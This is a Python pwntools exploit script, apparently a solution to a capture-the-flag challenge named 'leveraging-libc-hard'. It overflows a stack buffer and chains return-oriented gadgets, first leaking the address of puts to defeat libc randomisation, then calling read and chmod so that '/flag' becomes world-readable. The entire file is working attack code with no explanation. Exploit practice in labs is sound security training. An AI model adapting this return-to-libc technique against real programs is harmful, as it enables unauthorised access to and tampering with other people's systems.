#!/usr/bin/python3

import time
from pwn import *


context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/leveraging-libc-hard')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop_elf = ROP(elf)


rbp = 0x7ffd559d6330
input_start = rbp - 0x60
ret = rbp + 0x8
offset = ret - input_start

pop_rdi = rop_elf.find_gadget(["pop rdi","ret"]).address
pop_rsi = rop_elf.find_gadget(["pop rsi","pop r15","ret"]).address
ret = rop_elf.find_gadget(["ret"]).address

payload = b"A" * offset 
payload += p64(pop_rdi) + p64(elf.got.puts) + p64(elf.sym.puts) + p64(elf.sym.challenge)

io = process()

io.send(payload)
data = io.recvuntil(b"Leaving!\n")
print(data.decode())

leak_libc = u64(io.recvline(keepends=False).ljust(8,b"\x00"))

libc.address = leak_libc - libc.sym.puts
rop_libc = ROP(libc)

pop_rdx = rop_libc.find_gadget(["pop rdx","pop r12","ret"]).address

payload = b"A"*offset
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(elf.bss() + 0x200) + p64(0)
payload += p64(pop_rdx) + p64(10) + p64(0)
payload += p64(ret)
payload += p64(elf.sym.read)
payload += p64(pop_rdi) + p64(elf.bss() + 0x200)
payload += p64(pop_rsi) + p64(511) + p64(0)
payload += p64(ret)
payload += p64(libc.sym.chmod)

io.send(payload)
time.sleep(1)
io.send(b"/flag")

io.interactive()
